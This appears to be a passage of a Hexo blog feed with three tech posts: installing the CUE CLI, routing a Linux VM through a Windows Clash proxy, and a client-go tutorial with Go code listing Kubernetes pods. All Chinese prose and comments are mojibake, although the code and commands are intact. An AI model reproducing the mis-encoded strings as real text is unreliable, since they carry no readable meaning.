v0.4.3 linux/amd64<br>[root@node1 cuetest]<span class="hljs-comment"># mv cue /usr/local/bin</span><br>[root@node1 cuetest]<span class="hljs-comment"># cue version</span><br>cue version v0.4.3 linux/amd64<br></code></pre></td></tr></table></figure><h2 id="20230606æ›´æ–°"><a href="#20230606æ›´æ–°" class="headerlink" title="20230606æ›´æ–°"></a>20230606æ›´æ–°</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/cue-lang/cue/releases/download/v0.5.0/cue_v0.5.0_linux_amd64.tar.gz<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘linuxä¸­ä½¿ç”¨windowsçš„clash</title>
    <link href="/2022/08/14/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91linux%E4%B8%AD%E4%BD%BF%E7%94%A8windows%E7%9A%84clash/"/>
    <url>/2022/08/14/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91linux%E4%B8%AD%E4%BD%BF%E7%94%A8windows%E7%9A%84clash/</url>
    
    <content type="html"><![CDATA[<h2 id="ç¯å¢ƒè¯´æ˜"><a href="#ç¯å¢ƒè¯´æ˜" class="headerlink" title="ç¯å¢ƒè¯´æ˜"></a>ç¯å¢ƒè¯´æ˜</h2><p>clashè¿è¡Œåœ¨windowsä¸‹</p><p>è™šæ‹Ÿæœºæ˜¯vmwareçš„natç½‘ç»œæ¨¡å¼ï¼Œæ‰€ä»¥ä½¿ç”¨çš„æ˜¯vm8ç½‘å¡</p><p>è™šæ‹Ÿæœºçš„ipï¼š192.168.56.168</p><p>è™šæ‹Ÿæœºçš„ç½‘å…³ï¼š192.168.56.2</p><p>windowsä¸‹vm8ç½‘å¡çš„ipï¼š192.168.56.1</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814164916886.png" alt="image-20220814164916886"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814171028887.png" alt="image-20220814171028887"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814170848227.png" alt="image-20220814170848227"></p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814171119246.png" alt="image-20220814171119246"></p><h2 id="æ“ä½œéƒ¨ç½²"><a href="#æ“ä½œéƒ¨ç½²" class="headerlink" title="æ“ä½œéƒ¨ç½²"></a>æ“ä½œéƒ¨ç½²</h2><h3 id="1ï¼‰clashæ‰“å¼€â€å…è®¸å±€åŸŸç½‘è¿æ¥â€"><a href="#1ï¼‰clashæ‰“å¼€â€å…è®¸å±€åŸŸç½‘è¿æ¥â€" class="headerlink" title="1ï¼‰clashæ‰“å¼€â€å…è®¸å±€åŸŸç½‘è¿æ¥â€"></a>1ï¼‰clashæ‰“å¼€â€å…è®¸å±€åŸŸç½‘è¿æ¥â€</h3><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814165037015.png" alt="image-20220814165037015"></p><p>é¼ æ ‡æ”¾åˆ°â€å…è®¸å±€åŸŸç½‘è¿æ¥â€œçš„åœ°æ–¹ï¼Œå¯ä»¥çœ‹åˆ°vm8çš„ip</p><p>è¿™ä¸ªipæ˜¯windowsä¸­vm8çš„ç½‘å¡ip</p><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814165150900.png" alt="image-20220814165150900"></p><h3 id="2ï¼‰windowså…³é—­é˜²ç«å¢™æˆ–è€…å¼€æ”¾7890ç«¯å£"><a href="#2ï¼‰windowså…³é—­é˜²ç«å¢™æˆ–è€…å¼€æ”¾7890ç«¯å£" class="headerlink" title="2ï¼‰windowså…³é—­é˜²ç«å¢™æˆ–è€…å¼€æ”¾7890ç«¯å£"></a>2ï¼‰windowså…³é—­é˜²ç«å¢™æˆ–è€…å¼€æ”¾7890ç«¯å£</h3><p>æ‰“å¼€æ§åˆ¶é¢æ¿<br>é€‰æ‹©windows é˜²ç«å¢™<br>ç‚¹å‡»å·¦ä¾§çš„â€œé«˜çº§è®¾ç½®â€é€‰é¡¹<br>è®¾ç½®å…¥ç«™è§„åˆ™<br>ç‚¹å‡»â€œæ–°å»ºè§„åˆ™â€ï¼Œç‚¹é€‰â€œç«¯å£â€ï¼Œå•å‡» â€œä¸‹ä¸€æ­¥â€ï¼ˆæ³¨æ„ï¼šå…¥ç«™è§„åˆ™æ˜¯æŒ‡åˆ«äººç”µè„‘è®¿é—®è‡ªå·±ç”µè„‘ï¼›å‡ºç«™è§„åˆ™å®è´¨è‡ªå·±ç”µè„‘è®¿é—®åˆ«äººç”µè„‘ï¼‰</p><p>é€‰æ‹©ç›¸åº”çš„åè®®ï¼ˆä¾‹å¦‚ï¼šæ·»åŠ 7890ç«¯å£ï¼Œé€‰æ‹©TCPï¼›ç‰¹å®šæœ¬åœ°ç«¯å£å¤„è¾“å…¥7890ï¼›ï¼‰<br>é€‰æ‹©â€œå…è®¸è¿æ¥â€ï¼Œç‚¹å‡»â€œä¸‹ä¸€æ­¥â€ï¼›<br>å‹¾é€‰â€œåŸŸâ€ï¼Œâ€œä¸“ç”¨â€ï¼Œâ€œå…¬å¸â€ï¼Œç‚¹å‡»â€œä¸‹ä¸€æ­¥â€<br>è¾“å…¥ç«¯å£åç§°ï¼Œç‚¹â€œå®Œæˆâ€å³å¯</p><h3 id="3ï¼‰linuxæœºå™¨ä¸Šé…ç½®ä»£ç†åœ°å€åŠç«¯å£"><a href="#3ï¼‰linuxæœºå™¨ä¸Šé…ç½®ä»£ç†åœ°å€åŠç«¯å£" class="headerlink" title="3ï¼‰linuxæœºå™¨ä¸Šé…ç½®ä»£ç†åœ°å€åŠç«¯å£"></a>3ï¼‰linuxæœºå™¨ä¸Šé…ç½®ä»£ç†åœ°å€åŠç«¯å£</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim ~/.bashrc<br><br>æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š<br><span class="hljs-built_in">export</span> http_proxy=http://192.168.56.1:7890<br><span class="hljs-built_in">export</span> https_proxy=http://192.168.56.1:7890<br><br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><h3 id="4ï¼‰æµ‹è¯•"><a href="#4ï¼‰æµ‹è¯•" class="headerlink" title="4ï¼‰æµ‹è¯•"></a>4ï¼‰æµ‹è¯•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æµ‹è¯•7890ç«¯å£æ˜¯å¦é€š</span><br>telnet 192.168.56.1 7890<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814170200958.png" alt="image-20220814170200958"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æµ‹è¯•èƒ½å¦æˆåŠŸè®¿é—®google</span><br>curl www.google.com<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ningan123/PicGo_Images@main/img/image-20220814170442788.png" alt="image-20220814170442788"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/lyy-blog/p/14923024.html"><a href="https://www.cnblogs.com/lyy-blog/p/14923024.html">linuxæ·»åŠ ä»£ç†åˆ°clash for windowsä»£ç†</a></a></p><p><a href="https://blog.csdn.net/nihaize0520/article/details/80714108">Win10 å¼€æ”¾é˜²ç«å¢™ä¸­æŸä¸€ç«¯å£</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202208) client-goå­¦ä¹ ä¸å®è·µ</title>
    <link href="/2022/08/09/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202208)%20client-go%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <url>/2022/08/09/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202208)%20client-go%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<h2 id="client-goå®¢æˆ·ç«¯å¯¹è±¡"><a href="#client-goå®¢æˆ·ç«¯å¯¹è±¡" class="headerlink" title="client-goå®¢æˆ·ç«¯å¯¹è±¡"></a>client-goå®¢æˆ·ç«¯å¯¹è±¡</h2><p>client-goæ”¯æŒRESTClientã€ClientSetã€DynamicClientã€DiscoveryClientå››ç§å®¢æˆ·ç«¯ä¸Kubernetes Api Serverè¿›è¡Œäº¤äº’ã€‚</p><ul><li><p>RESTClientï¼šæœ€åŸºç¡€çš„å®¢æˆ·ç«¯ï¼Œä¸»è¦æ˜¯å¯¹HTTPè¯·æ±‚è¿›è¡Œäº†å°è£…ï¼Œæ”¯æŒJsonå’ŒProtobufæ ¼å¼çš„æ•°æ®ã€‚</p></li><li><p>DiscoveryClientï¼šå‘ç°å®¢æˆ·ç«¯ï¼Œè´Ÿè´£å‘ç°APIServeræ”¯æŒçš„èµ„æºç»„ã€èµ„æºç‰ˆæœ¬å’Œèµ„æºä¿¡æ¯çš„(GVR)ã€‚</p></li><li><p>ClientSetï¼šè´Ÿè´£æ“ä½œKuberneteså†…ç½®çš„èµ„æºå¯¹è±¡ï¼Œä¾‹å¦‚ï¼šPodã€Servicesç­‰ã€‚</p></li><li><p>DynamicClientï¼šåŠ¨æ€å®¢æˆ·ç«¯ï¼Œå¯ä»¥å¯¹ä»»æ„çš„Kubernetesèµ„æºå¯¹è±¡è¿›è¡Œé€šç”¨æ“ä½œï¼ŒåŒ…æ‹¬CRDã€‚</p></li></ul><h2 id="client-go-demo-å·¥ç¨‹åˆå§‹åŒ–"><a href="#client-go-demo-å·¥ç¨‹åˆå§‹åŒ–" class="headerlink" title="client-go-demo å·¥ç¨‹åˆå§‹åŒ–"></a>client-go-demo å·¥ç¨‹åˆå§‹åŒ–</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master ~]<span class="hljs-comment"># mkdir client-go-demo</span><br>[root@master ~]<span class="hljs-comment">#</span><br>[root@master ~]<span class="hljs-comment">#</span><br>[root@master ~]<span class="hljs-comment"># cd client-go-demo/</span><br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment"># ll</span><br>æ€»ç”¨é‡ 0<br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment"># go mod init ningan.com/client-go-demo</span><br>go: creating new go.mod: module ningan.com/client-go-demo<br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment"># ll</span><br>æ€»ç”¨é‡ 4<br>-rw-r--r-- 1 root root 42 8æœˆ   9 04:06 go.mod<br>[root@master client-go-demo]<span class="hljs-comment">#</span><br>[root@master client-go-demo]<span class="hljs-comment"># cat go.mod</span><br>module ningan.com/client-go-demo<br><br>go 1.17<br><br></code></pre></td></tr></table></figure><h2 id="RESTClient"><a href="#RESTClient" class="headerlink" title="RESTClient"></a>RESTClient</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>RESTClientæ˜¯æœ€åŸºç¡€çš„å®¢æˆ·ç«¯ï¼Œå…¶ä»–çš„ClientSetã€DynamicClientå³DscoveryClientéƒ½æ˜¯åŸºäºRESTClientå®ç°çš„ã€‚</p><p>RESTClientå¯¹HTTP Clientè¿›è¡Œäº†å°è£…ï¼Œå®ç°äº†Restfulé£æ ¼çš„APIã€‚</p><p>å®ƒå…·æœ‰å¾ˆé«˜çš„çµæ´»æ€§ï¼Œæ•°æ®ä¸ä¾èµ–äºæ–¹æ³•å’Œèµ„æºï¼Œå› æ­¤RESTClientèƒ½å¤Ÿå¤„ç†å¤šç§ç±»å‹çš„è°ƒç”¨ï¼Œè¿”å›ä¸åŒçš„æ•°æ®æ ¼å¼ã€‚</p><p>demoç¤ºä¾‹ï¼šé€šè¿‡RESTClientç¤ºä¾‹åˆ—å‡ºæŸä¸€å‘½åç©ºé—´ä¸‹çš„Podèµ„æºå¯¹è±¡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><br>corev1 <span class="hljs-string">&quot;k8s.io/api/core/v1&quot;</span><br>metav1 <span class="hljs-string">&quot;k8s.io/apimachinery/pkg/apis/meta/v1&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/kubernetes/scheme&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/rest&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: è·å–kube-systemå‘½åç©ºé—´ä¸‹çš„Podåˆ—è¡¨</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1. k8sçš„é…ç½®æ–‡ä»¶</span><br><span class="hljs-comment">2. ä¿è¯å¼€å‘æœºèƒ½é€šè¿‡è¿™ä¸ªé…ç½®æ–‡ä»¶è¿æ¥åˆ°k8sé›†ç¾¤</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 1. åŠ è½½é…ç½®æ–‡ä»¶ï¼Œç”Ÿæˆconfigå¯¹è±¡</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br><span class="hljs-comment">// panic(err.Error())</span><br>&#125;<br><br><span class="hljs-comment">// 2. é…ç½®APIè·¯å¾„  è¯·æ±‚çš„HTTPè·¯å¾„</span><br>config.APIPath = <span class="hljs-string">&quot;api&quot;</span> <span class="hljs-comment">// pods,  /api/v1/pods</span><br><span class="hljs-comment">// config.APIPath = &quot;apis&quot; // deployments,  /apis/apps/v1/namespaces/&#123;namespace&#125;/deployments/&#123;deployment&#125;</span><br><br><span class="hljs-comment">// 3. é…ç½®è¯·æ±‚çš„èµ„æºç»„/èµ„æºç‰ˆæœ¬ GV</span><br>config.GroupVersion = &amp;corev1.SchemeGroupVersion <span class="hljs-comment">// æ— åèµ„æºç»„, group: &quot; &quot;, version: &quot;v1&quot;</span><br><br><span class="hljs-comment">// 4. é…ç½®æ•°æ®çš„ç¼–è§£ç å·¥å…·  åºåˆ—åŒ–å’Œååºåˆ—åŒ–</span><br>config.NegotiatedSerializer = scheme.Codecs<br><br><span class="hljs-comment">// 5. é€šè¿‡kubeconfgé…ç½®ä¿¡æ¯å®ä¾‹åŒ–RESTClientå¯¹è±¡</span><br>restClient, err := rest.RESTClientFor(config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><br><span class="hljs-comment">// 6. å®šä¹‰æ¥æ”¶è¿”å›å€¼çš„å˜é‡</span><br>result := &amp;corev1.PodList&#123;&#125;<br><br><span class="hljs-comment">// è·ŸAPIServeräº¤äº’</span><br>err = restClient.<br>Get().                                                                  <span class="hljs-comment">// RESTClientå¯¹è±¡æ„å»ºHTTPè¯·æ±‚å‚æ•°  è¯·æ±‚æ–¹æ³•ï¼šGetã€Postã€Putã€Deleteã€Patch</span><br>Namespace(<span class="hljs-string">&quot;kube-system&quot;</span>).                                               <span class="hljs-comment">// å‘½åç©ºé—´</span><br>Resource(<span class="hljs-string">&quot;pods&quot;</span>).                                                       <span class="hljs-comment">// èµ„æºå</span><br>VersionedParams(&amp;metav1.ListOptions&#123;Limit: <span class="hljs-number">50</span>&#125;, scheme.ParameterCodec). <span class="hljs-comment">// å°†ä¸€äº›æŸ¥è¯¢é€‰é¡¹(å¦‚limitã€TimeoutSeconds)æ·»åŠ åˆ°è¯·æ±‚å‚æ•°ä¸­ limitå‚æ•°è¡¨ç¤ºæœ€å¤šæ£€ç´¢å‡ºå¤šå°‘ä¿¡æ¯</span><br>Do(context.TODO()).                                                     <span class="hljs-comment">// æ‰§è¡Œè¯¥è¯·æ±‚</span><br>Into(result)                                                            <span class="hljs-comment">// å°†kube-apiserverè¿”å›çš„ç»“æœï¼ˆResultå¯¹è±¡ï¼‰è§£æåˆ°corev1.PodListå¯¹è±¡ä¸­</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1ï¼‰Getå®šä¹‰è¯·æ±‚æ–¹å¼ï¼Œè¿”å›äº†ä¸€ä¸ªRequestç»“æ„ä½“å¯¹è±¡ã€‚è¿™ä¸ªRequestç»“æ„ä½“å¯¹è±¡ï¼Œå°±æ˜¯æ„å»ºè®¿é—®APIServerç”¨çš„ã€‚</span><br><span class="hljs-comment">2ï¼‰ä¾æ¬¡æ‰§è¡Œäº†Namespaceã€Resourceã€VersionedParamsï¼Œæ„å»ºä¸APIServeräº¤äº’çš„å‚æ•°ã€‚</span><br><span class="hljs-comment">3ï¼‰Doæ–¹æ³•é€šè¿‡requetså‘èµ·è¯·æ±‚ï¼Œç„¶åé€šè¿‡transformResponseè§£æè¯·æ±‚è¿”å›ï¼Œå¹¶ç»‘å®šåˆ°å¯¹åº”èµ„æºå¯¹è±¡çš„ç»“æ„ä½“å¯¹è±¡ä¸Šã€‚è¿™é‡Œçš„è¯ï¼Œè¡¨ç¤ºçš„æ˜¯corev1.PodListå¯¹è±¡ã€‚</span><br><span class="hljs-comment">4ï¼‰requestå…ˆæ˜¯æ£€æŸ¥äº†æœ‰æ²¡æœ‰å¯ç”¨çš„clientï¼Œåœ¨è¿™é‡Œå¼€å§‹è°ƒç”¨net/httpåŒ…çš„åŠŸèƒ½ã€‚</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) RESTClientå‘é€è¯·æ±‚çš„è¿‡ç¨‹å¯¹Goè¯­è¨€æ ‡å‡†åº“net/httpè¿›è¡Œäº†å°è£…ï¼Œç”±Do -&gt; Requestå‡½æ•°å®ç°ã€‚</span><br><span class="hljs-comment">2) è¯·æ±‚å‘é€ä¹‹å‰éœ€è¦æ ¹æ®è¯·æ±‚å‚æ•°ç”Ÿæˆè¯·æ±‚çš„RESTful URLï¼Œç”±r.URL().String()å‡½æ•°å®Œæˆã€‚ http://xxxx:x/api/v1/namespaces/kube-system/pods?limit=1</span><br><span class="hljs-comment">3) é€šè¿‡Goè¯­è¨€æ ‡å‡†åº“net/httpå‘RESTful URL(å³kube-apiserver)å‘é€è¯·æ±‚ï¼Œè¯·æ±‚å¾—åˆ°çš„ç»“æœå­˜æ”¾åœ¨http.Responseçš„Bodyå¯¹è±¡ä¸­ï¼Œfnå‡½æ•°ï¼ˆå³transformResponseï¼‰å°†ç»“æœè½¬åŒ–ä¸ºèµ„æºå¯¹è±¡ã€‚</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// æ ¼å¼åŒ–è¾“å‡ºç»“æœ</span><br><span class="hljs-keyword">for</span> _, item := <span class="hljs-keyword">range</span> result.Items &#123;<br>fmt.Printf(<span class="hljs-string">&quot;namespace: %v, name: %v, status: %v\n&quot;</span>, item.Namespace, item.Name, item.Status.Phase)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master demo1]<span class="hljs-comment"># go run main.go</span><br>namespace: kube-system, name: calico-kube-controllers-67878b879f-2x5xg, status: Running<br>namespace: kube-system, name: calico-node-4xwrz, status: Running<br>namespace: kube-system, name: metrics-server-68955dc6f-xvv9t, status: Running<br></code></pre></td></tr></table></figure><h2 id="ClientSet"><a href="#ClientSet" class="headerlink" title="ClientSet"></a>ClientSet</h2><p>RESTClientæ˜¯ä¸€ç§æœ€åŸºç¡€çš„å®¢æˆ·ç«¯ï¼Œä½¿ç”¨æ—¶éœ€è¦æŒ‡å®šResourceå’ŒVersionç­‰ä¿¡æ¯ï¼Œç¼–å†™ä»£ç éœ€è¦æå‰çŸ¥é“Resourceæ‰€åœ¨çš„Groupå’Œå¯¹åº”çš„Versionä¿¡æ¯ã€‚</p><p>ç›¸æ¯”RESTClientï¼ŒClientSetä½¿ç”¨èµ·æ¥æ›´åŠ ä¾¿æ·ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¼€å‘è€…å¯¹Kubernetesè¿›è¡ŒäºŒæ¬¡å¼€å‘æ—¶é€šå¸¸ä½¿ç”¨ClientSetã€‚</p><p>ClientSetåœ¨RESTClientçš„åŸºç¡€ä¸Šå°è£…äº†å¯¹Resourceå’ŒVersionçš„ç®¡ç†æ–¹æ³•ã€‚æ¯ä¸€ä¸ªResourceå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œè€ŒClientSetåˆ™æ˜¯å¤šä¸ªå®¢æˆ·ç«¯çš„é›†åˆï¼Œæ¯ä¸€ä¸ªResourceå’ŒVersionéƒ½ä»¥å‡½æ•°çš„æ–¹æ³•æš´éœ²ç»™å¼€å‘è€…ï¼Œä¾‹å¦‚ClientSetæä¾›çš„RbacV1ã€CoreV1ã€NetworkingV1ç­‰æ¥å£å‚æ•°ã€‚</p><p>demoç¤ºä¾‹ï¼šé€šè¿‡ClientSetç¤ºä¾‹åˆ—å‡ºæŸä¸€å‘½åç©ºé—´ä¸‹çš„Podèµ„æºå¯¹è±¡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><br>metav1 <span class="hljs-string">&quot;k8s.io/apimachinery/pkg/apis/meta/v1&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/kubernetes&quot;</span><br><span class="hljs-string">&quot;k8s.io/client-go/tools/clientcmd&quot;</span><br>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">@Author: ningan</span><br><span class="hljs-comment">@Desc: è·å–kube-systemå‘½åç©ºé—´ä¸‹çš„Podåˆ—è¡¨</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 1. åŠ è½½é…ç½®æ–‡ä»¶ï¼Œç”Ÿæˆconfigå¯¹è±¡</span><br>config, err := clientcmd.BuildConfigFromFlags(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;/root/.kube/config&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 2. é€šè¿‡kubeconfigé…ç½®ä¿¡æ¯å®ä¾‹åŒ–ClientSet è¯¥å¯¹è±¡ç”¨äºç®¡ç†æ‰€æœ‰Resourceçš„å®¢æˆ·ç«¯</span><br>clientset, err := kubernetes.NewForConfig(config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><br><span class="hljs-comment">// 3. æŸ¥è¯¢</span><br>result, err := clientset.<br>CoreV1().            <span class="hljs-comment">// è¿”å›CoreV1Clientå®ä¾‹</span><br>Pods(<span class="hljs-string">&quot;kube-system&quot;</span>). <span class="hljs-comment">// æŒ‡å®šæŸ¥è¯¢çš„èµ„æºé¢„è®¡æŒ‡å®šèµ„æºçš„namespaceï¼Œnamespaceå¦‚æœä¸ºç©ºï¼Œè¡¨ç¤ºæŸ¥è¯¢æ‰€æœ‰namespace</span><br><span class="hljs-comment">// Namespaces().     // æŸ¥è¯¢namespace</span><br>List(context.TODO(), metav1.ListOptions&#123;Limit: <span class="hljs-number">50</span>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err.Error())<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">1) CoreV1è¿”å›CoreV1Clientå®ä¾‹å¯¹è±¡</span><br><span class="hljs-comment">2) Pods è°ƒç”¨äº†newPodså‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›çš„è¯•PodInterfaceå¯¹è±¡ï¼ŒPodInterfaceå¯¹è±¡å®ç°äº†Podsèµ„æºç›¸å…³çš„å…¨éƒ¨æ–¹æ³•ï¼ŒåŒæ—¶å†newPodsé‡Œé¢è¿˜å°†RESTClientå®ä¾‹å¯¹è±¡èµ‹å€¼ç»™äº†å¯¹åº”çš„Clientå±æ€§</span><br><span class="hljs-comment">3) 